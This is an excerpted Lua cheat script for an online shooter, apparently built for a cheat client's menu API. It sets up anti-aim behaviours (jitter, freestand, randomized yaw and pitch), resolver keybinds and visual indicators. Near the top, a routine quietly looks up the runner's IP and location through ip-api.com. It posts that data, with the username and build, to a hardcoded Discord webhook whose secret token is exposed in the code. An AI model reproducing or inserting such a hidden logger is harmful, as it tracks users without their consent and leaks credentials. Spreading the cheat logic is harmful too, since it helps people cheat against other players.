...
--local obex_data = obex_fetch and obex_fetch() or {username = 'Source', build = 'Source', discord='Source'}
...
local webhook = {
    Run = function()
        ...
        asd_http_ouo.get("http://ip-api.com/json/", function(success, response)
            ...
            local webhook = discord.new("https://discord.com/api/webhooks/1019333465990238341/sUC00bAM3eYf1tgEHFKJeJqV2OBH_1Fb6dKn6AioiRrLxzonHBhZ1-QjCXyRdFKz2Msm")
            ...
            embed:addField("Build", obex_data.build, true)
            --local username = database.read("mlc_alt_cert").username_2
            embed:addField("Username",obex_data.username, true)
...
local vars = {
    detection = 0, freestand = 0, freestand_mode = 0, cache_detection = 0, fs_bodyyaw = 180, random = 0, random_3way = 0,
    ...
    for i=1, #State do
        AA[i] = {
            antiaim_state = menu.combo("AA", State[i], "Logic Selection", {
                "Manual", --"Dynamic", 
                "Freestand", "Reverse Freestand", "Jitter",  "Slow Jitter", "Randomized Static", "Randomized 3-Way", "Opposite"
            }),
...
local lotus = {
    ...
    antiaim = {
        ...
        avoid_options = menu.table("AA", "Pitch down", "Avoid unsafe pitch", {
            "Avoid silent", "Reduce aim step"
        }),

        aim_step = menu.slider("AA", "Aim steps", "reduce steps length", 5, 10),

        avoid_silent = menu.checkbox("AA", "Roll", "reduce silent aim"),

        pitch_offset = menu.slider("AA", "Pitch", "Offset", 40, 89, 40),
        yaw_offset = menu.slider("AA", "Yaw", "Lean Value", 0, 150, 30),
    ...
    visuals = {
        ...
        net_graph = menu.table("AA", "Netgraph", "Custom Netgraph", {
            "Custom Name Tag", "Disable Keybinds", "Costum colors", "Disable LBY Bar"
        }),
        ...
        body_menu = menu.combo("AA", "Body Yaw", "Font type", {
            "'❯' and '❮'", "'-' and '-'", "'←' and '→'"
        }),
...
local bind_system_resolver = false
local bind_systen_manual = false
local antiaim_lib = {
    ...
    manual = function()
        ...
        if bind_systen_manual == key_state then return end

        bind_systen_manual = key_state

        -->> Cache Keybinds
        if (bind_systen_manual and key_state == 1) then ui_set(lotus.antiaim.invert_state, 2) return end
    ...
    manual_r = function()
        ...
        if bind_system_resolver == key_state then return end
    
        bind_system_resolver = key_state
...
local visible_handler = function()
    ...
    ui_set_visible(lotus.antiaim.avoid_options, pitch_down)
    ...
    -- Body yaw indicator
    local body_yaw_ind = menu.contains(ui_get(lotus.visuals.ind_menu), "Body yaw Indicator") and feature
    ui_set_visible(lotus.visuals.body_menu, body_yaw_ind)
...
local function bodyyaw_handler(cmd)
    ...
    local reverse_freestand = menu.find(ui_get(AA[i].antiaim_state), "Reverse Freestand")
    if reverse_freestand then freestand_builder(i) end
    ...
    local random_3way = menu.find(ui_get(AA[i].antiaim_state), "Randomized 3-Way")
    if random_3way then antiaim_lib.random_3way() end
    ...
    -->> Implement Antiaim
    local avoid_silent = (menu.contains(ui_get(lotus.antiaim.avoid_options), "Avoid silent")) and vars.fire
    local reduce_step = (menu.contains(ui_get(lotus.antiaim.avoid_options), "Reduce aim step"))
    ...
    local desync = ui_get(references.body_yaw[2])
    ...
    local yaw = {
        ...
        yaw =       (pitch_down and ((desync > 0 and 180 - _preset.yaw) or 
                                     (desync < 0 and 180 - _preset.yaw))) or 180,

    }

    local steps = ui_get(lotus.antiaim.aim_step)
    aim_step.pitch = (lerp(aim_step.pitch, yaw.pitch, steps))
    aim_step.yaw = (lerp(aim_step.yaw, yaw.yaw, steps)) 

    local lby = (ui_get(lotus.antiaim.lby_mode) == "Default") and Anim.velocity(entity_get_local_player()) < 20 and 180 or 180 or
    ...
    local body_yaw = {
        ...
        body_yaw =  (dynamic and vars.detection * lby) or
                    ...
                    (reverse_freestand and vars.freestand * lby * -1) or
                    (slow and (vars.switch and lby or -lby)) or
                    (jitter and ui_get(AA[i].jitter_body_yaw)) or
                    (random and vars.random * lby) or
                    (random_3way and vars.random_3way * lby) or
    ...
    local _yaw =    (avoid_silent and yaw.yaw) or 
                    (reduce_step and (desync > 0 and aim_step.yaw or -aim_step.yaw)) or 
                    ((desync > 0 and yaw.yaw) or -yaw.yaw)

    local _pitch =  (avoid_silent and yaw.pitch) or 
                    (reduce_step and aim_step.pitch) or 
                    (yaw.pitch)

    ui_set(references.pitch[1], yaw.pitch_base)
    ui_set(references.pitch[2], math.floor(_pitch + 0.5))
    ui_set(references.yaw_base, yaw.yaw_base)
    ui_set(references.yaw[1], yaw.yaw_set)
    ui_set(references.yaw[2], math.floor(_yaw + 0.5))
...
local indicator_handler = function()
    ...
    local lby_bar = menu.contains(ui_get(lotus.visuals.net_graph), "Disable LBY Bar")
    if lby_bar then return end
...
local function bodyyaw_indicator()
    ...
    local font_picker = ui_get(lotus.visuals.body_menu)

    --"'❯' and '❮'", "'-' and '-'", "'←' and '→'"

    if font_picker == "'❯' and '❮'" then font.left = "❯" font.right = "❮" end
    if font_picker == "'-' and '-'" then font.left = "-" font.right = "-" end
    if font_picker == "'←' and '→'" then font.left = "→" font.right = "←" end
...
local function resolver_indicator()
   ...
   -- renderer.indicator(180, 180, 180, 255, "R: " .. desync)
end
